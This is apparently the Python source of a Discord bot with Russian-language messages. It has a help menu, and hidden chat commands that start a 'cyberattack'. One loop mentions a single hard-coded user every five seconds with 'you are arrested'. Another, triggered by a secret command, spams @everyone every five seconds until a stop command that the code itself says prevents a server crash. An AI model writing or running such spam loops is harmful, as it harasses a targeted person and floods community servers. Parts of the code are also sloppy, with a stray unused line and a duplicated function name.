import discord

from discord.ext import tasks
from dotenv import load_dotenv, find_dotenv
from os import getenv
import LOGS

load_dotenv(find_dotenv())


class MyClient(discord.Client):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.background_task.start()
        self.background_task_eve.start()

    @staticmethod
    async def on_ready():
        print("Bot is ready")

    async def on_message(self, message: discord.Message):
        """Проверяет, пишет человек или бот"""
        if message.author == self.user:
            return
        """Проверяет, что написал человек и отвечает"""
        if message.content.lower() == "привет":
            await message.channel.send("Привет")
        if message.content.lower() == "стоп":
            await message.channel.send("Кибератака завершена")
            _Spam.setIsStatusSpam(True)
        if message.content.lower() == "старт":
            await message.channel.send("Начинаю кибератаку")
            _Spam.setIsStatusSpam(False)
        if message.content == getenv("secret_command"):
            await message.channel.send("Секретная команда активирована")
            _SpamEveryone.start = False
        if message.content == getenv("secret_command_stop"):
            await message.channel.send("Предотвращение краша сервера")
            _SpamEveryone.start = True
            embed = discord.Embed
        if message.content == "#help":
            await message.channel.send("```Вас приветствует дискорд-бот Человек. Чем я могу вам помочь? \r"
                                       "Список возможностей: \r"
                                       "            📋  Information(!help Information)\r"
                                       "!help !info !stats !serverinfo !user !bio !inviteinfo\r"
                                       "                🛡️Moderation(!help Moderation)\r"
                                       "!warns\r"
                                       "                 🏆  Ranking(!help Ranking)\r"
                                       "!rank !leaders\r"
                                       "                    🎵  Music(!help Music)\r"
                                       "!play !youtube !skip !queue !shuffle !promote !remove !current !repeat !pause !start !stop !volume !here !restart !rewind !forward !seek\r"
                                       "                      😄  Fun(!help Fun)\r"
                                       "!fuss !coin !8 ball !dog !cat !fox\r"
                                       "                  🔧  Utility(!help Utility)\r"
                                       "!avatar !steam !reminder !rand !t !wikifur !math !emote !covid !bonus\r"
                                       "                            Удачи!```")
        if message.content == "!info":
            await message.channel.send("Человек - это потенциально новый бот, написанный на общедоступном языке"
                                       "программирования python. По функционалу он не уступает таким известным ботам,"
                                       "как MEE6 или JuniperBot, но у него также есть свои отличительные черты, которые"
                                       " не оставят вас равнодушными. Например: вы можете включить функцию разговора с"
                                       " ботом, хоть он и ИИ, но очень хорошо проработан, следовательно вы сможете "
                                       "поговорить с ним практически на любые темы. У бота есть скрытые функции, которые"
                                       " вы можете узнать, если перейдёте на мой GitHub: https://github.com/FedorKatta")

    @tasks.loop(seconds=5)
    async def background_task(self):
        """Упоминает конкретного игрока на сервере."""
        if not _Spam.getIsStatusSpam():
            channel: discord.TextChannel = self.get_channel(974657113492168712)
            user: discord.User = self.get_user(722516249002901547)
            mess = f"Вы арестованы {user.mention}"
            await channel.send(mess)

    @tasks.loop(seconds=5)
    async def background_task_eve(self):
        """Упоминает всех игроков на сервере."""
        if not _SpamEveryone.start:
            channel: discord.TextChannel = self.get_channel(974657113492168712)
            mess = "@everyone"
            await channel.send(mess, allowed_mentions=discord.AllowedMentions(everyone=True))

    @background_task.before_loop
    async def before_my_task(self):
        await self.wait_until_ready()

    @background_task_eve.before_loop
    async def before_my_task(self):
        await self.wait_until_ready()


class Spam:
    def __init__(self):
        self.isStop: bool = True

    def setIsStatusSpam(self, arg: bool = True):
        self.isStop = arg

    def getIsStatusSpam(self):
        return self.isStop


class SpamEveryone:
    def __init__(self):
        self._start: bool = True

    @property
    def start(self) -> bool:
        return self._start

    @start.setter
    def start(self, arg: bool = True):
        self._start = arg

    @start.getter
    def start(self):
        return self._start


client = MyClient(intents=discord.Intents().all())

if __name__ == "__main__":
    _Spam = Spam()
    _SpamEveryone = SpamEveryone()
    client.run(getenv("token"))
